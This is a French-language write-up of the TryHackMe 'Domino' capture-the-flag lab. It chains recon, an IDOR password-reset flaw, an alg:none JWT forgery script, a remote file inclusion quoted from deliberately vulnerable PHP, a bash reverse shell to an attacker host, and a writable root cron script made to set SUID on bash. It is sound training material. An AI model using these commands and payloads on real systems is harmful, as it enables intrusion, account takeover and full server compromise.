---
title: "TryHackMe - Domino"
platform: "TryHackMe"
difficulty: "Medium"
tags: [web,osint,idor,jwt,rfi,rce,php,privilege escalation,cron,ctf,enumeration]
---

## Résumé

Dans ce CTF notre objectif est de récupérer 5 flags sur une machine Linux hébergeant le portail interne fictif "NexusCorp", en progressant d'un accès web anonyme jusqu'au compte root. La chaîne d'exploitation enchaîne de l'OSINT léger, un contournement de contrôle d'accès (IDOR) sur la fonctionnalité de reset de mot de passe, une falsification de JWT (alg:none), une inclusion de fichier distant (RFI) menant à l'exécution de code, puis une élévation de privilèges via réutilisation de identifiants et enfin un cron root modifiable.

## Outils/Technos Utilisés

Reconnaissance :

- Nmap
- Gobuster

Exploitation Web / Accès Initial :

- Navigateur web (code source, DevTools)
- Burp Suite (Repeater, Decoder, Inspector JWT)
- curl
- OpenSSL
- Python (scripts JWT/HMAC, forge de tokens)
- Hashcat (tentative de cassage du secret JWT)

Elévation de privilèges :

- SSH
- Client MySQL
- find
- getcap
- Cron abuse / SUID

## Reconnaissance

Après un scan de la machine cible on voit 2 ports ouverts, un service SSH et un serveur web à analyser :

```bash
nmap -sC -sV -p- -T4 <<target>>
Starting Nmap 7.94SVN ( https://nmap.org ) at <<date>>
Nmap scan report for <<target>>
Host is up (0.00018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: NexusCorp Portal
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Exploitation initiale

Le site "NexusCorp Portal" propose un formulaire de login au format firstname.lastname, une fonction "forgot password" et une page "Our Team" listant les employés avec leur poste et leur email (@nexus.corp). En croisant les noms de cette page on obtient une liste de 6 usernames candidats (laura.hayes, michael.chen, sarah.johnson, robert.wilson, emma.taylor, david.brown), tous confirmés valides puisque acceptés par la fonction "forgot password".

En inspectant le code source de la page "Our Team" on repère un script /static/app.js, qui contient une clé de chiffrement laissée en dur dans le code (mauvaise pratique commentée "TODO: move to env before prod deployment") :
```js
const CONFIG = {
    apiBase: '/api',
    // Encryption key for backup config decryption - AES-ECB-128
    _backupKey: 'N3xusK3y2024!!',
};
```

Un gobuster sur la racine du site révèle plusieurs répertoires, dont /backup/ :

```bash
gobuster dir -u http://<<target>> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
/support   (Status: 301)
/admin     (Status: 301)
/static    (Status: 301)
/api       (Status: 301)
/javascript (Status: 301)
/backup    (Status: 301)
```

/backup/ contient un fichier config.enc, confirmé par un README.txt comme étant chiffré en AES-128-ECB avec la clé trouvée dans app.js (à compléter avec des null bytes pour atteindre 16 octets) :

```bash
openssl enc -aes-128-ecb -d -in config.enc -out config_dec.txt -K 4e337875734b33793230323421210000 -nopad
cat config_dec.txt
{"app_name":"NexusCorp Portal","version":"2.3.1","deploy_env":"production","system_user":"devops"}
```

```bash
$ cat hint.txt 
follow the r a b b i t
```

On obtient ainsi le nom d'un utilisateur système (devops), une piste à garder pour la suite.

Un gobuster ciblé sur /api/ révèle plusieurs endpoints, dont /api/reset.php (405 en GET, attend du POST) et /api/files.php (401, protégé). En envoyant une requête POST en JSON directement à /api/reset.php (plutôt qu'en passant par le formulaire HTML qui masque une partie de la réponse), on découvre que l'API renvoie directement un token de reset en clair, censé normalement être envoyé par email :

```bash
curl -X POST http://<<target>>/api/reset.php -H "Content-Type: application/json" -d '{"username":"michael.chen"}'
{"token":"<<token>>","reset_url":"/reset.php?token=<<token>>"}
```

Sur la page /reset.php?token=..., le champ "username to reset" n'est pas verrouillé sur l'utilisateur pour qui le token a été généré. En le remplaçant par un autre username non-admin (sarah.johnson), on parvient à réinitialiser son mot de passe avec le token de michael.chen — une faille de type IDOR / broken access control, le token n'étant pas lié côté serveur à l'utilisateur qui l'a demandé.

Une fois connecté avec sarah.johnson, le dashboard propose un "File Viewer" via /api/files.php?name=, nécessitant un JWT récupéré sur /api/auth/token.php. Ce JWT a un rôle user, insuffisant pour l'endpoint qui exige un rôle admin. Le code JS de session ne vérifiant aucune signature côté client, on tente une attaque classique alg:none : forger un JWT non signé avec un rôle admin, en Python :
```python
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).rstrip(b'=').decode()

header = {'alg': 'none', 'typ': 'JWT'}
payload = {'sub': 'sarah.johnson', 'role': 'admin', 'iat': <<iat>>, 'exp': <<exp>>}
token = f'{b64url(header)}.{b64url(payload)}.'
```

Le serveur accepte ce token sans vérifier la signature. En lisant le code source de files.php via ce nouvel accès admin (?name=api/files.php), on découvre une seconde vulnérabilité bien plus critique : une RFI volontaire.

```php
// RFI: fetch remote URL and eval as PHP (allow_url_fopen enabled)
if (strpos($name, "http://") === 0 || strpos($name, "https://") === 0) {
    $remote = @file_get_contents($name);
    ob_start();
    eval(str_replace("<?php", "", $remote));
    $output = ob_get_clean();
    echo json_encode(["output" => $output]);
    exit;
}
```

Si le paramètre name commence par http:// ou https://, le contenu distant est récupéré puis directement évalué comme du PHP. En hébergeant un payload PHP sur notre machine attaquante et en le pointant via ce paramètre, on obtient l'exécution de commandes arbitraires sur le serveur :

```bash
curl "http://<<target>>/api/files.php?name=http://<<attacker>>:8000/payload.php" -H "Authorization: Bearer <<jwt_forge>>"
{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

On répète l'opération avec un payload de reverse shell PHP (system("bash -c 'bash -i >& /dev/tcp/<<attacker>>/4444 0>&1'")) et un listener netcat en écoute, ce qui donne un shell interactif en tant que www-data. Le premier flag ("foothold") se trouve dans /opt/flag3.txt.

Une fois sur le système, la lecture directe de /var/www/html/config.php révèle les secrets applicatifs :

```php
define('DB_PASS', '<<db_password>>');
define('JWT_SECRET', '<<jwt_secret>>');
define('APP_SECRET', '<<app_secret>>');
```

Le mot de passe de la base de données fait explicitement référence à "devops" — une réutilisation de mot de passe classique. En testant ce même mot de passe en SSH pour l'utilisateur système devops (repéré plus tôt via config.enc), la connexion aboutit : mouvement latéral réussi, et récupération du flag utilisateur dans /home/devops/user.txt.

## Élévation de privilèges

Sur le compte devops, sudo -l ne donne aucun droit et aucun SUID/capability custom n'est trouvé. En revanche, une recherche des fichiers modifiables par l'utilisateur courant révèle deux scripts intéressants :

```bash
find / -writable -type f 2>/dev/null | grep -v "/proc\|/snap"
/opt/admin_bot.py
/opt/monitoring/health_report.sh
```

ps aux confirme que /opt/admin_bot.py tourne en permanence en tant que root. Sa lecture révèle un bot qui visite périodiquement des URLs trouvées dans les tickets de support avec une session admin forgée (piste alternative de type SSRF/XSS aveugle, non exploitée ici).

Le fichier /opt/monitoring/health_report.sh, lui, est exécuté automatiquement toutes les minutes par un mécanisme root caché (invisible dans /etc/crontab), comme le confirment les timestamps réguliers du fichier /var/log/nexus_health.log. Étant modifiable par devops, il suffit d'y injecter une commande pour l'exécuter en root à la prochaine exécution :

```bash
echo 'chmod u+s /bin/bash' >> /opt/monitoring/health_report.sh
# après ~1 minute :
ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 <<date>> /bin/bash
```

Le bit SUID est posé, confirmant que le script tourne bien en root. Il suffit alors de :

```bash
/bin/bash -p
id
uid=1001(devops) gid=1001(devops) euid=0(root) groups=1001(devops)
```

pour obtenir un shell avec les privilèges effectifs root, et lire le flag root.

Deux flags additionnels étaient également à trouver via ce même accès root :

- Un flag caché dans un champ notes de la table users de la base MySQL (nexusdb), consultable directement une fois root avec les identifiants de config.php.
- Un flag affiché sur le vrai panel /admin/, accessible en forgeant un cookie de session nexus_session correctement signé (HMAC-SHA256 avec APP_SECRET, mécanisme découvert dans le code source de admin_bot.py) pour l'utilisatrice admin réelle laura.hayes.

## Flags Trouvés

- Flag "foothold" : /opt/flag3.txt, obtenu après l'exploitation de la RFI → RCE en www-data.
- Flag utilisateur : /home/devops/user.txt, obtenu après mouvement latéral SSH via réutilisation de mot de passe.
- Flag root : /root/root.txt, obtenu après l'abus du cron root caché exécutant health_report.sh.
- Flag "profil admin" : champ notes de l'utilisatrice laura.hayes dans la table users (base nexusdb), consulté en root via le client MySQL.
- Flag "panel admin" : affiché sur /admin/ après authentification avec un cookie de session forgé et correctement signé pour laura.hayes.

## Conclusion

Domino est un CTF très complet qui enchaîne plusieurs classes de vulnérabilités différentes plutôt qu'une seule technique poussée : reconnaissance/OSINT léger, IDOR sur un flow de reset de mot de passe, falsification de JWT (alg:none), RFI menant à du RCE, réutilisation de secrets à plusieurs reprises (clé de chiffrement, mot de passe base de données) et enfin une élévation de privilèges via un script exécuté périodiquement en root mais modifiable par un utilisateur non privilégié. C'est un bon terrain d'entraînement pour pratiquer une méthodologie complète de bout en bout plutôt qu'une seule faille isolée.

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
